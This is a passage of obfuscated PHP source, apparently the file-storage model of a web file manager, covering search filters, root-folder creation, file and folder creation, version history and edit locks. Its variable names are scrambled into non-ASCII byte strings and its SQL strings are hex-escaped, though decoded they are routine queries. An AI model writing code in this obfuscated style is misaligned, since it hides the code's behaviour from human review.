$­µ†şı´[50])) { return !1; } if (isset($°Õô¸áÓ[$­µ†şı´[486]]) && $°Õô¸áÓ[$­µ†şı´[486]] != $­µ†şı´[836]) { if ($°Õô¸áÓ[$­µ†şı´[486]] == $­µ†şı´[78] && !$ÚÖª’) { return !1; } if ($°Õô¸áÓ[$­µ†şı´[486]] != $­µ†şı´[78] && $ÚÖª’) { return !1; } if (!strstr($œ©®§ª[$­µ†şı´[169]], $­µ†şı´[50] . $°Õô¸áÓ[$­µ†şı´[486]] . $­µ†şı´[50])) { return !1; } } if (isset($°Õô¸áÓ[$­µ†şı´[2225]]) && $°Õô¸áÓ[$­µ†şı´[2225]] < $œ©®§ª[$­µ†şı´[79]]) { return !1; } if (isset($°Õô¸áÓ[$­µ†şı´[2226]]) && $°Õô¸áÓ[$­µ†şı´[2226]] > $œ©®§ª[$­µ†şı´[79]]) { return !1; } if (isset($°Õô¸áÓ[$­µ†şı´[662]]) && $°Õô¸áÓ[$­µ†şı´[662]] != $œ©®§ª[$­µ†şı´[529]]) { return !1; } return !0; } public function listSearchChildren($Ş™å‰óÇ, $˜æ¼ÖõÀ = 5000) { $ê„€Ğø• =& $_SERVER[óÔë„ú]; $¤¹ÕÎÂÑ = array(); $€³¬®õÖ = $this->sourceInfo($Ş™å‰óÇ); $ü„ç§áŸ = array($ê„€Ğø•[584] => array($ê„€Ğø•[459], $€³¬®õÖ[$ê„€Ğø•[584]] . $€³¬®õÖ[$ê„€Ğø•[193]] . $ê„€Ğø•[613])); $ßÔîáä¶ = $this->field($ê„€Ğø•[79])->where($ü„ç§áŸ)->limit($˜æ¼ÖõÀ + 1)->select(); $üÙìæÌÍ = is_array($ßÔîáä¶) ? count($ßÔîáä¶) : 0; if ($üÙìæÌÍ > $˜æ¼ÖõÀ) { return $this->_listSearchChildrenNear($Ş™å‰óÇ, $˜æ¼ÖõÀ); } $šŞòòÌ = $this->field($ê„€Ğø•[193])->where($ü„ç§áŸ)->select(); $¤¹ÕÎÂÑ = array_to_keyvalue($šŞòòÌ, $ê„€Ğø•[12], $ê„€Ğø•[193]); return $¤¹ÕÎÂÑ; } private function _listSearchChildrenNear($‰é×¢¿¶, $´¬ãÄİ†) { $€«£¤ß¡ =& $_SERVER[óÔë„ú]; $áØ–€ = array(); $óöÉ÷© = array($€«£¤ß¡[192] => $‰é×¢¿¶); $ˆË™¼”ö = $this->field($€«£¤ß¡[2227])->where($óöÉ÷©)->select(); $”¼¾‚¼¦ = array_to_keyvalue(array_filter_by_field($ˆË™¼”ö, $€«£¤ß¡[485], $€«£¤ß¡[91]), $€«£¤ß¡[12], $€«£¤ß¡[193]); $áØ–€ = array_merge($áØ–€, array_to_keyvalue($ˆË™¼”ö, $€«£¤ß¡[12], $€«£¤ß¡[193])); if (!$”¼¾‚¼¦) { return $áØ–€; } $óöÉ÷© = array($€«£¤ß¡[192] => array($€«£¤ß¡[7], $”¼¾‚¼¦)); $ˆË™¼”ö = $this->field($€«£¤ß¡[2227])->where($óöÉ÷©)->limit($´¬ãÄİ†)->select(); $áØ–€ = array_merge($áØ–€, array_to_keyvalue($ˆË™¼”ö, $€«£¤ß¡[12], $€«£¤ß¡[193])); $áØ–€ = array_slice($áØ–€, 0, intval($´¬ãÄİ†)); return $áØ–€; } private function _listSearchBindPinyin($±ÏòÀŸ, &$’¢òüãø, &$Šƒ¦‚ÎË) { $ïÍäØøá =& $_SERVER[óÔë„ú]; if (!isset($±ÏòÀŸ[$ïÍäØøá[2055]]) || !$±ÏòÀŸ[$ïÍäØøá[2055]]) { return; } if (!Input::check($±ÏòÀŸ[$ïÍäØøá[2055]], $ïÍäØøá[394]) || strlen($±ÏòÀŸ[$ïÍäØøá[2055]]) < 2) { return; } $åöáÑ¿¢ = "\114\x45\x46\124\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x69\157\x5f\163\x6f\165\162\x63\145\137\x6d\x65\x74\x61\x20\155\x65\x74\x61\40\x6f\156\40\163\157\x75\x72\143\145\x2e\163\157\165\162\143\145\111\104\40\x3d\40\155\x65\164\141\x2e\x73\157\x75\x72\143\x65\x49\x44"; $ŞëÂäì = array(); $Šƒ¦‚ÎË = str_replace(array($ïÍäØøá[262], $ïÍäØøá[53], $ïÍäØøá[2228]), $ïÍäØøá[12], $Šƒ¦‚ÎË); $Šƒ¦‚ÎË = $ïÍäØøá[511] . str_replace($ïÍäØøá[50], $ïÍäØøá[512], $Šƒ¦‚ÎË); $ÆÁíÛ  = $’¢òüãø[$ïÍäØøá[32]]; unset($’¢òüãø[$ïÍäØøá[32]]); foreach ($’¢òüãø as $Åà™Ú®Ò => $«›¨ìˆÔ) { $ŞëÂäì[$ïÍäØøá[511] . $Åà™Ú®Ò] = $«›¨ìˆÔ; } foreach ($ÆÁíÛ  as $« ù™»æ) { $ŞëÂäì[] = array($ïÍäØøá[516] => $« ù™»æ, $ïÍäØøá[1063] => $ïÍäØøá[2059], array($ïÍäØøá[2229] => $« ù™»æ, $ïÍäØøá[2230] => array($ïÍäØøá[7], array($ïÍäØøá[538], $ïÍäØøá[537])))); } $this->join($åöáÑ¿¢); $’¢òüãø = $ŞëÂäì; } private function _parseSearchWhere($ëªõùƒè) { $œıÇ®Ä¸ =& $_SERVER[óÔë„ú]; $’ß’àØÓ = array(); if (isset($ëªõùƒè[$œıÇ®Ä¸[820]]) && $ëªõùƒè[$œıÇ®Ä¸[820]]) { $’ß’àØÓ[$œıÇ®Ä¸[88]] = array($œıÇ®Ä¸[2231], $ëªõùƒè[$œıÇ®Ä¸[820]]); } if (isset($ëªõùƒè[$œıÇ®Ä¸[821]]) && $ëªõùƒè[$œıÇ®Ä¸[821]]) { $†êé›¿ä = array($œıÇ®Ä¸[2232], $ëªõùƒè[$œıÇ®Ä¸[821]]); if ($’ß’àØÓ[$œıÇ®Ä¸[88]]) { $’ß’àØÓ[$œıÇ®Ä¸[88]] = array($’ß’àØÓ[$œıÇ®Ä¸[88]], $†êé›¿ä, $œıÇ®Ä¸[2233]); } else { $’ß’àØÓ[$œıÇ®Ä¸[88]] = $†êé›¿ä; } } if (isset($ëªõùƒè[$œıÇ®Ä¸[2225]]) && $ëªõùƒè[$œıÇ®Ä¸[2225]] > 0) { $’ß’àØÓ[$œıÇ®Ä¸[79]] = array($œıÇ®Ä¸[2231], $ëªõùƒè[$œıÇ®Ä¸[2225]]); } if (isset($ëªõùƒè[$œıÇ®Ä¸[2226]]) && $ëªõùƒè[$œıÇ®Ä¸[2226]]) { $†êé›¿ä = array($œıÇ®Ä¸[2232], $ëªõùƒè[$œıÇ®Ä¸[2226]]); if ($’ß’àØÓ[$œıÇ®Ä¸[79]]) { $’ß’àØÓ[$œıÇ®Ä¸[79]] = array($’ß’àØÓ[$œıÇ®Ä¸[79]], $†êé›¿ä, $œıÇ®Ä¸[2233]); } else { $’ß’àØÓ[$œıÇ®Ä¸[79]] = $†êé›¿ä; } } if (isset($ëªõùƒè[$œıÇ®Ä¸[662]]) && $ëªõùƒè[$œıÇ®Ä¸[662]]) { $’ß’àØÓ[] = array($œıÇ®Ä¸[529] => $ëªõùƒè[$œıÇ®Ä¸[662]], $œıÇ®Ä¸[527] => $ëªõùƒè[$œıÇ®Ä¸[662]], $œıÇ®Ä¸[1063] => $œıÇ®Ä¸[2059]); } if (isset($ëªõùƒè[$œıÇ®Ä¸[486]]) && $ëªõùƒè[$œıÇ®Ä¸[486]]) { $—÷àŞø = $ëªõùƒè[$œıÇ®Ä¸[486]]; if ($—÷àŞø == $œıÇ®Ä¸[78]) { $’ß’àØÓ[$œıÇ®Ä¸[485]] = 1; } else { if ($—÷àŞø == $œıÇ®Ä¸[2234]) { $’ß’àØÓ[$œıÇ®Ä¸[485]] = 0; } else { if ($—÷àŞø) { $—÷àŞø = is_array($—÷àŞø) ? $—÷àŞø : explode($œıÇ®Ä¸[50], $—÷àŞø); $’ß’àØÓ[$œıÇ®Ä¸[486]] = array($œıÇ®Ä¸[492], $—÷àŞø); $’ß’àØÓ[$œıÇ®Ä¸[485]] = 0; } } } } $this->_parseSearchParent($ëªõùƒè, $’ß’àØÓ); if (isset($ëªõùƒè[$œıÇ®Ä¸[2055]]) && trim($ëªõùƒè[$œıÇ®Ä¸[2055]])) { $§‡Ü¹îµ = trim($ëªõùƒè[$œıÇ®Ä¸[2055]]); $îçâ¤û = explode($œıÇ®Ä¸[53], $§‡Ü¹îµ); if (strlen($§‡Ü¹îµ) > 2 && (substr($§‡Ü¹îµ, 0, 1) == $œıÇ®Ä¸[121] && substr($§‡Ü¹îµ, -1) == $œıÇ®Ä¸[121]) || substr($§‡Ü¹îµ, 0, 1) == $œıÇ®Ä¸[58] && substr($§‡Ü¹îµ, -1) == $œıÇ®Ä¸[58]) { $§‡Ü¹îµ = substr($§‡Ü¹îµ, 1, -1); $îçâ¤û = array($§‡Ü¹îµ); } $’ß’àØÓ[$œıÇ®Ä¸[32]] = array(array($œıÇ®Ä¸[612], $œıÇ®Ä¸[2057] . $§‡Ü¹îµ . $œıÇ®Ä¸[2057])); if (count($îçâ¤û) > 1) { $’ß’àØÓ[$œıÇ®Ä¸[32]] = array(); foreach ($îçâ¤û as $‹ÈËä´) { if (!trim($‹ÈËä´)) { continue; } $’ß’àØÓ[$œıÇ®Ä¸[32]][] = array($œıÇ®Ä¸[612], $œıÇ®Ä¸[2057] . trim($‹ÈËä´) . $œıÇ®Ä¸[2057]); } } } return $’ß’àØÓ; } private function _parseSearchParent($¥»´Ï†, &$ÆÓÃ°ß‚) { $³øÖÛŸÛ =& $_SERVER[óÔë„ú]; if (!isset($¥»´Ï†[$³øÖÛŸÛ[192]]) || !$¥»´Ï†[$³øÖÛŸÛ[192]]) { return; } $îóÙ­ª = $this->pathInfo($¥»´Ï†[$³øÖÛŸÛ[192]]); $ĞöÍ¹ìÒ = $îóÙ­ª[$³øÖÛŸÛ[192]] . $³øÖÛŸÛ[12] === $³øÖÛŸÛ[228]; $Û­Òõ† = $îóÙ­ª[$³øÖÛŸÛ[190]] == $³øÖÛŸÛ[578]; if ($îóÙ­ª[$³øÖÛŸÛ[595]] == $³øÖÛŸÛ[596]) { $˜ä´³“Â = $this->sourceInfo($¥»´Ï†[$³øÖÛŸÛ[192]]); $îóÙ­ª[$³øÖÛŸÛ[584]] = $˜ä´³“Â[$³øÖÛŸÛ[584]]; } $ÆÓÃ°ß‚[$³øÖÛŸÛ[652]] = array($³øÖÛŸÛ[612], $îóÙ­ª[$³øÖÛŸÛ[584]] . $¥»´Ï†[$³øÖÛŸÛ[192]] . $³øÖÛŸÛ[613]); $³ÏäòÖ• = isset($¥»´Ï†[$³øÖÛŸÛ[1915]]) && in_array($³øÖÛŸÛ[578], $¥»´Ï†[$³øÖÛŸÛ[1915]]); if (!$³ÏäòÖ• || !$Û­Òõ† || !$ĞöÍ¹ìÒ || !$îóÙ­ª[$³øÖÛŸÛ[487]]) { return; } if (!AuthModel::authCheckRoot($îóÙ­ª[$³øÖÛŸÛ[487]][$³øÖÛŸÛ[488]])) { return; } $…µµó©½ = $îóÙ­ª[$³øÖÛŸÛ[569]] . $³øÖÛŸÛ[12]; if ($…µµó©½ == $³øÖÛŸÛ[91]) { unset($ÆÓÃ°ß‚[$³øÖÛŸÛ[652]]); $ÆÓÃ°ß‚[$³øÖÛŸÛ[190]] = self::TYPE_GROUP; return; } $º¦™§„É = Model($³øÖÛŸÛ[585])->groupChildrenAll($…µµó©½); $œ¿¤üÍ = count($º¦™§„É); if ($œ¿¤üÍ <= 1) { return; } $Åé åı« = array($³øÖÛŸÛ[192] => 0, $³øÖÛŸÛ[190] => self::TYPE_GROUP, $³øÖÛŸÛ[569] => array($³øÖÛŸÛ[7], $º¦™§„É)); $ôÖ”ŒÍÓ = $this->field($³øÖÛŸÛ[2235])->where($Åé åı«)->limit($œ¿¤üÍ)->select(); $ÆÓÃ°ß‚[$³øÖÛŸÛ[652]] = array(); foreach ($ôÖ”ŒÍÓ as $’Û¾ªö) { $ÆÓÃ°ß‚[$³øÖÛŸÛ[652]][] = array($³øÖÛŸÛ[612], $³øÖÛŸÛ[594] . $’Û¾ªö[$³øÖÛŸÛ[193]] . $³øÖÛŸÛ[613]); } $ÆÓÃ°ß‚[$³øÖÛŸÛ[652]][] = $³øÖÛŸÛ[2059]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ò·–ø§ù) { $—Äóä‘ï =& $_SERVER[óÔë„ú]; $»ü°Ëı = Model($—Äóä‘ï[577])->where(array($—Äóä‘ï[1749] => $Ò·–ø§ù))->find(); $™ªªŠéà = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ò·–ø§ù, $»ü°Ëı[$—Äóä‘ï[32]]); $this->userDesktopAdd($™ªªŠéà); return $™ªªŠéà; } public function userDesktopAdd($Ş’ªÆÆŞ) { $Ø½‘”¤Í =& $_SERVER[óÔë„ú]; $Üİ´åµ = LNG($Ø½‘”¤Í[2236]); $ôóµÂœÁ = $this->mkdir($Ş’ªÆÆŞ, $Üİ´åµ); $this->metaSet($ôóµÂœÁ, $Ø½‘”¤Í[2237], $Ø½‘”¤Í[91]); $this->metaSet($Ş’ªÆÆŞ, $Ø½‘”¤Í[2238], $ôóµÂœÁ); } public function userPathSafeAdd($àÒÚ¿€Á) { $û®ÀôÆ³ =& $_SERVER[óÔë„ú]; $Èº¡Ö¸ô = Model($û®ÀôÆ³[577])->getInfoFull($àÒÚ¿€Á); if (!$Èº¡Ö¸ô) { return !1; } if (_get($Èº¡Ö¸ô, $û®ÀôÆ³[599])) { return $Èº¡Ö¸ô[$û®ÀôÆ³[539]][$û®ÀôÆ³[2239]]; } $ó‹Í¾ºÍ = $this->_mkdirRoot(SourceModel::TYPE_USER, $àÒÚ¿€Á, $û®ÀôÆ³[2240], $û®ÀôÆ³[506]); Model($û®ÀôÆ³[577])->metaSet($àÒÚ¿€Á, $û®ÀôÆ³[2239], $ó‹Í¾ºÍ); $this->metaSet($ó‹Í¾ºÍ, $û®ÀôÆ³[2241], $àÒÚ¿€Á); return $ó‹Í¾ºÍ; } public function groupRootAdd($ÙñÒƒÁÒ) { $ãÁÛ™´— =& $_SERVER[óÔë„ú]; $€úÕàÍã = Model($ãÁÛ™´—[585])->where(array($ãÁÛ™´—[2049] => $ÙñÒƒÁÒ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÙñÒƒÁÒ, $€úÕàÍã[$ãÁÛ™´—[32]]); } public function systemRootPathAdd($ºó’±èß) { if ($ºó’±èß != $_SERVER[óÔë„ú][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ºó’±èß); } public function userRootRemove($–Ê†ı„) { $Â“”Ò›¸ = $this->targetSourceRoot(SourceModel::TYPE_USER, $–Ê†ı„, !0); foreach ($Â“”Ò›¸ as $şûÁãÜú) { if (!$şûÁãÜú) { continue; } $this->remove($şûÁãÜú[$_SERVER[óÔë„ú][193]], !1); } } public function groupRootRemove($“¢ ä¯Í) { $¸·áëä = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $“¢ ä¯Í); if (!$¸·áëä) { return; } $this->remove($¸·áëä[$_SERVER[óÔë„ú][193]], !1); } private function _mkdirRoot($¢âòõ”, $§ó»ÇÛ, $Ôí´·«ï, $×Î±ò¡‘ = '') { $®’¡íœ =& $_SERVER[óÔë„ú]; $ØËáõÕ’ = defined($®’¡íœ[2183]) ? USER_ID : 0; $Çû•Ï = array($®’¡íœ[477] => 0, $®’¡íœ[648] => $¢âòõ”, $®’¡íœ[649] => $§ó»ÇÛ, $®’¡íœ[646] => 1, $®’¡íœ[650] => $ØËáõÕ’, $®’¡íœ[651] => $ØËáõÕ’, $®’¡íœ[647] => $×Î±ò¡‘, $®’¡íœ[652] => $®’¡íœ[594], $®’¡íœ[504] => 0, $®’¡íœ[617] => 0, $®’¡íœ[542] => 0, $®’¡íœ[653] => $®’¡íœ[12]); if ($õ€İ„ = $this->where($Çû•Ï)->find()) { return $õ€İ„[$®’¡íœ[193]]; } $ÙØŸ—® = "\115\157\144\145\154\x53\x6f\x75\x72\143\145\x2e\x6d\153\144\x69\162\x52\157\157\x74\x2e{$¢âòõ”}\x2e{$§ó»ÇÛ}\56" . $Ôí´·«ï; CacheLock::lock($ÙØŸ—®); $Çû•Ï[$®’¡íœ[32]] = $Ôí´·«ï; $úÚ™®™ø = $this->add($Çû•Ï); $ı“²è»ù = array($®’¡íœ[654] => short_id($úÚ™®™ø)); $this->where(array($®’¡íœ[491] => $úÚ™®™ø))->save($ı“²è»ù); CacheLock::unlock($ÙØŸ—®); return $úÚ™®™ø; } private function targetSourceRoot($æŒ‚ã§ , $–‹á’Ä , $šğÏõğâ = false) { $óãÅ¨… =& $_SERVER[óÔë„ú]; $´Áô™ÅÜ = array($óãÅ¨…[477] => 0, $óãÅ¨…[648] => $æŒ‚ã§ , $óãÅ¨…[649] => $–‹á’Ä ); if ($šğÏõğâ) { $½Ì””  = $this->where($´Áô™ÅÜ)->select(); return $½Ì””  ? $½Ì””  : array(); } $é¹¥ó¼€ = $this->where($´Áô™ÅÜ)->find(); return $é¹¥ó¼€ ? $é¹¥ó¼€ : array(); } public function sourceRootGroup($ßÄ¥ã™¶) { $ë Ã•‡Ü =& $_SERVER[óÔë„ú]; if (is_string($ßÄ¥ã™¶)) { $ßÄ¥ã™¶ = array($ßÄ¥ã™¶); } $¨öùßÅ¿ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ßÄ¥ã™¶, $ë Ã•‡Ü[220]); $Ò¢¸¸¡ = array($ë Ã•‡Ü[445] => $¨öùßÅ¿, $ë Ã•‡Ü[442] => array($ë Ã•‡Ü[818] => count($ßÄ¥ã™¶))); $this->_listDataApply($Ò¢¸¸¡[$ë Ã•‡Ü[445]]); $this->_listMake($Ò¢¸¸¡); return array_to_keyvalue($Ò¢¸¸¡[$ë Ã•‡Ü[85]], $ë Ã•‡Ü[569]); } public function mkfile($ï«ç‚, $Õ¿™Éª¹, $áç¿œ¦² = '', $¥•ÆÓÍß = REPEAT_RENAME) { $ÒÄ§ˆÀ× =& $_SERVER[óÔë„ú]; $’–ÍÕÙ§ = Model($ÒÄ§ˆÀ×[674])->addFileByContent($áç¿œ¦², $Õ¿™Éª¹); return $this->_createFileCall($ï«ç‚, $Õ¿™Éª¹, $’–ÍÕÙ§, $¥•ÆÓÍß, $ÒÄ§ˆÀ×[1415]); } public function addFile($˜³çÌè‡, $ó®Ï„—, $¹¾™€©, $™ã˜½İ = false, $æÙá–½  = REPEAT_RENAME) { $ŒÖÙ¾›· = Model($_SERVER[óÔë„ú][674])->addFile($ó®Ï„—, $¹¾™€©, $™ã˜½İ); return $this->_createFileCall($˜³çÌè‡, $¹¾™€©, $ŒÖÙ¾›·, $æÙá–½ ); } public function addFileByFileID($Ñïº¬º÷, $ØìşŸâ , $¾î³²…î, $ìü…ÔË = REPEAT_RENAME) { $¬§ÂÎÊğ =& $_SERVER[óÔë„ú]; $ŠÂ«ĞğÒ = Model($¬§ÂÎÊğ[674])->find($ØìşŸâ ); Model($¬§ÂÎÊğ[674])->linkAdd($ØìşŸâ ); return $this->_createFileCall($Ñïº¬º÷, $¾î³²…î, $ŠÂ«ĞğÒ, $ìü…ÔË); } public function addFileByRemote($µß»’Ú, $¬îÈˆæ, $•²‰ªÔå, $ÃËåŠãß = array(), $µñœ’¾ğ = REPEAT_RENAME) { $€Ÿ¯ã§ = Model($_SERVER[óÔë„ú][674])->addFileByRemote($¬îÈˆæ, $•²‰ªÔå, $ÃËåŠãß); return $this->_createFileCall($µß»’Ú, $•²‰ªÔå, $€Ÿ¯ã§, $µñœ’¾ğ); } private function _createFileCall($¼­±°İ, $ÔÛ’È¸¯, $¤¤½şàÀ, $ş¶áĞ¢³, $¾³øşÕ = "\x75\x70\154\157\141\x64") { $õ¼“‹ƒ =& $_SERVER[óÔë„ú]; $ı¼“Èğà = !1; $this->setMasterDB(); $this->lockWriteStart($¼­±°İ, $ÔÛ’È¸¯); $¨‹Œ†é€ = $this->fileNameExist($¼­±°İ, $ÔÛ’È¸¯); $†ªó¢û™ = $this->_createFile($¼­±°İ, $ÔÛ’È¸¯, $¤¤½şàÀ, $ş¶áĞ¢³, $ı¼“Èğà); if (!$ı¼“Èğà) { Model($õ¼“‹ƒ[544])->remove($¤¤½şàÀ[$õ¼“‹ƒ[541]]); } if ($ı¼“Èğà && $†ªó¢û™ && $†ªó¢û™ != $¨‹Œ†é€) { Model($õ¼“‹ƒ[2209])->eventCreate($†ªó¢û™, $¾³øşÕ); } $this->lockWriteEnd($¼­±°İ, $ÔÛ’È¸¯); return $†ªó¢û™; } public function mkdir($¬‚·‘, $ˆ¾¬¢­Ğ, $æÕ¶¿Ô³ = REPEAT_SKIP) { $’ë†¼ÌÂ =& $_SERVER[óÔë„ú]; $this->setMasterDB(); $¸¡š±ÒÓ = $this->sourceInfo($¬‚·‘); if (!$¸¡š±ÒÓ) { return !1; } $this->lockWriteStart($¬‚·‘, $ˆ¾¬¢­Ğ); if ($æÕ¶¿Ô³ !== !1) { $ÚŸ¦ÍÍß = $this->fileNameExist($¬‚·‘, $ˆ¾¬¢­Ğ); if ($ÚŸ¦ÍÍß && $æÕ¶¿Ô³ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¬‚·‘, $ˆ¾¬¢­Ğ); return $ÚŸ¦ÍÍß; } $ˆ¾¬¢­Ğ = $this->fileNameAuto($¬‚·‘, $ˆ¾¬¢­Ğ, $æÕ¶¿Ô³); } $½†šì¥è = array($’ë†¼ÌÂ[646] => 1, $’ë†¼ÌÂ[494] => $ˆ¾¬¢­Ğ, $’ë†¼ÌÂ[647] => $’ë†¼ÌÂ[12], $’ë†¼ÌÂ[542] => 0, $’ë†¼ÌÂ[617] => 0); $ÄÊÅ²¯ = $this->_addSource($½†šì¥è, $¸¡š±ÒÓ); Model($’ë†¼ÌÂ[2209])->eventCreate($ÄÊÅ²¯, $’ë†¼ÌÂ[1416]); $this->lockWriteEnd($¬‚·‘, $ˆ¾¬¢­Ğ); return $ÄÊÅ²¯; } public function listSourceRoot($«²¬ã°, $ÍË‘‚¤ˆ, $º‘éÚëõ = "\163\x6f\x75\162\143\x65\111\104\54\x74\141\162\x67\145\164\111\x44\x2c\x73\151\172\x65") { $•±ö‚–¥ =& $_SERVER[óÔë„ú]; $µË„åÁÇ = $•±ö‚–¥[454]; $’•©«Ü½ = array(); $ùŸ˜ĞšÁ = 1024 * 50; $‰»½îÑ§ = is_array($‰»½îÑ§) ? $‰»½îÑ§ : array(); $î¦®À„ä = count($ÍË‘‚¤ˆ); $ç´Æ˜ = $this->tablePrefix . $•±ö‚–¥[2242]; for ($Å™¶¹ôõ = 0; $Å™¶¹ôõ < $î¦®À„ä; $Å™¶¹ôõ++) { $Ë‘éşæ = $ÍË‘‚¤ˆ[$Å™¶¹ôõ]; $µË„åÁÇ .= "\123\105\114\x45\x43\x54\40\52\x20\106\x52\117\x4d\40\x28\x53\x45\114\x45\103\124\x20{$º‘éÚëõ}\40\106\122\117\115\40\x60{$ç´Æ˜}\x60\40\127\110\105\122\105\40"; $µË„åÁÇ .= "\x60\160\x61\x72\145\156\164\x49\x44\x60\75\x30\x20\x41\x4e\104\x20\x60\x74\141\x72\147\x65\164\x49\104\x60\x3d{$Ë‘éşæ}\x20\101\x4e\104\x20\x60\164\141\x72\x67\145\164\x54\171\x70\x65\x60\75{$«²¬ã°}\40\x61\x6e\144\x20\146\x69\x6c\x65\x54\x79\160\145\x3d\47\47\40\154\151\x6d\x69\x74\x20\61\x29\x20\x61\163\40\x74\x62\137{$Å™¶¹ôõ}\x20\125\116\111\x4f\116\x20\101\x4c\x4c\40"; if ((strlen($µË„åÁÇ) >= $ùŸ˜ĞšÁ || $Å™¶¹ôõ == $î¦®À„ä - 1) && $µË„åÁÇ) { $µË„åÁÇ = substr($µË„åÁÇ, 0, -strlen($•±ö‚–¥[1101])); $¥Ş¹Ïİİ = $this->query($µË„åÁÇ); $µË„åÁÇ = $•±ö‚–¥[12]; $’•©«Ü½ = array_merge($’•©«Ü½, $¥Ş¹Ïİİ); } } return $’•©«Ü½; } private function _createFile($æ½õçØÊ, $‹™³¶ç«, $Ÿ£ˆç¦‡, $½•Ó†÷ö, &$öŠ„ÂøŒ) { $·Ğ¸À²É =& $_SERVER[óÔë„ú]; $‚çİÒ³Ò = $this->sourceInfo($æ½õçØÊ); if (!$Ÿ£ˆç¦‡ || !$‚çİÒ³Ò) { return !1; } if ($½•Ó†÷ö !== !1) { $§™¶„˜Ì = $this->fileNameExist($æ½õçØÊ, $‹™³¶ç«); } $öŠ„ÂøŒ = !0; if ($½•Ó†÷ö && $§™¶„˜Ì) { if ($½•Ó†÷ö == REPEAT_SKIP) { $öŠ„ÂøŒ = !1; return $§™¶„˜Ì; } else { if ($½•Ó†÷ö == REPEAT_REPLACE) { $††ç¬Şâ = $this->sourceInfo($§™¶„˜Ì); $‡„«×Àİ = $this->fileHistory($††ç¬Şâ, $Ÿ£ˆç¦‡[$·Ğ¸À²É[541]], $Ÿ£ˆç¦‡[$·Ğ¸À²É[79]]); if (!$‡„«×Àİ) { $öŠ„ÂøŒ = !1; } else { $this->folderSizeReset($æ½õçØÊ); } return $§™¶„˜Ì; } else { $‹™³¶ç« = $this->fileNameAuto($æ½õçØÊ, $‹™³¶ç«, $½•Ó†÷ö, !1); } } } $‚—ë ×Á = array($·Ğ¸À²É[646] => 0, $·Ğ¸À²É[494] => $‹™³¶ç«, $·Ğ¸À²É[647] => substr(get_path_ext($‹™³¶ç«), 0, 10), $·Ğ¸À²É[542] => $Ÿ£ˆç¦‡[$·Ğ¸À²É[541]], $·Ğ¸À²É[617] => $Ÿ£ˆç¦‡[$·Ğ¸À²É[79]]); $‰¦‹ÁßÀ = $this->_addSource($‚—ë ×Á, $‚çİÒ³Ò); $this->folderSizeReset($æ½õçØÊ, intval($‚—ë ×Á[$·Ğ¸À²É[79]])); return $‰¦‹ÁßÀ; } protected function fileHistory($ƒ‘’›Ô¾, $Ë˜Úæ„«, $óĞ¿¢¯Ã) { $ÑÎ…‡ =& $_SERVER[óÔë„ú]; if ($ƒ‘’›Ô¾[$ÑÎ…‡[541]] == $Ë˜Úæ„«) { return !1; } $this->checkLock($ƒ‘’›Ô¾[$ÑÎ…‡[193]], $Ë˜Úæ„«); Model($ÑÎ…‡[2243])->addHistory($ƒ‘’›Ô¾); $»… ÁØ = array($ÑÎ…‡[651] => USER_ID, $ÑÎ…‡[498] => time(), $ÑÎ…‡[541] => $Ë˜Úæ„«, $ÑÎ…‡[79] => $óĞ¿¢¯Ã); $this->where(array($ÑÎ…‡[491] => $ƒ‘’›Ô¾[$ÑÎ…‡[193]]))->save($»… ÁØ); $this->sourceCacheClear($ƒ‘’›Ô¾[$ÑÎ…‡[193]]); return !0; } public function checkLock($ü‚¨ôİ£, $„Êë±Ú¦) { $§áæ·ÕÆ =& $_SERVER[óÔë„ú]; $´Ëâ¹à¦ = $this->pathInfo($ü‚¨ôİ£); if (!$this->fileIsLock($´Ëâ¹à¦, !0)) { return; } $ıš®§ã¢ = Session::get($§áæ·ÕÆ[2244]); $±–ë£÷÷ = substr($´Ëâ¹à¦[$§áæ·ÕÆ[32]], 0, -1 - strlen($´Ëâ¹à¦[$§áæ·ÕÆ[169]])) . $§áæ·ÕÆ[1280] . $ıš®§ã¢ . $§áæ·ÕÆ[10] . $´Ëâ¹à¦[$§áæ·ÕÆ[169]]; $ÒÒ—¼Ó± = Model($§áæ·ÕÆ[674])->find($„Êë±Ú¦); $this->_createFileCall($´Ëâ¹à¦[$§áæ·ÕÆ[192]], $±–ë£÷÷, $ÒÒ—¼Ó±, REPEAT_REPLACE, $§áæ·ÕÆ[1415]); $é¬»æˆ = $´Ëâ¹à¦[$§áæ·ÕÆ[539]][$§áæ·ÕÆ[610]]; $Ï‰³àŸ = $é¬»æˆ[$§áæ·ÕÆ[2245]] ? $é¬»æˆ[$§áæ·ÕÆ[2245]] : $é¬»æˆ[$§áæ·ÕÆ[32]]; show_json(LNG($§áæ·ÕÆ[2246]) . $§áæ·ÕÆ[2247] . LNG($§áæ·ÕÆ[2248]) . $§áæ·ÕÆ[2249] . $Ï‰³àŸ . $§áæ·ÕÆ[2250], !1); } public function fileIsLock($½¡¼›‚ò, $½Õë« = false) { $‘›ƒÊâ =& $_SERVER[óÔë„ú]; if (!_get($½¡¼›‚ò, $‘›ƒÊâ[606], 0)) { return !1; } if ($½¡¼›‚ò[$‘›ƒÊâ[539]][$‘›ƒÊâ[609]] != USER_ID) { return !0; } $»ËÊü¢ƒ = $GLOBALS[$‘›ƒÊâ[6]][$‘›ƒÊâ[92]][$‘›ƒÊâ[607]]; if ($½¡¼›‚ò[$‘›ƒÊâ[539]][$‘›ƒÊâ[608]] <= time() - $»ËÊü¢ƒ) { $this->metaSet($½¡¼›‚ò[$‘›ƒÊâ[193]], $‘›ƒÊâ[609], null); $this->metaSet($½¡¼›‚ò[$‘›ƒÊâ[193]], $‘›ƒÊâ[608], null); } if ($½Õë«) { $this->metaSet($½¡¼›‚ò[$‘›ƒÊâ[193]], $‘›ƒÊâ[608], time()); } return !1; } private function _addSource($ŸÍÎ‰è‡, $ğ·Ñ°Çİ) { $¾•¡é¥¶ =& $_SERVER[óÔë„ú]; $¤–ß¨şœ = defined($¾•¡é¥¶[2183]) ? USER_ID : 0; $Ä½ö×•× = array($¾•¡é¥¶[648] => $ğ·Ñ°Çİ[$¾•¡é¥¶[190]], $¾•¡é¥¶[649] => $ğ·Ñ°Çİ[$¾•¡é¥¶[569]], $¾•¡é¥¶[650] => $¤–ß¨şœ, $¾•¡é¥¶[651] => $¤–ß¨şœ, 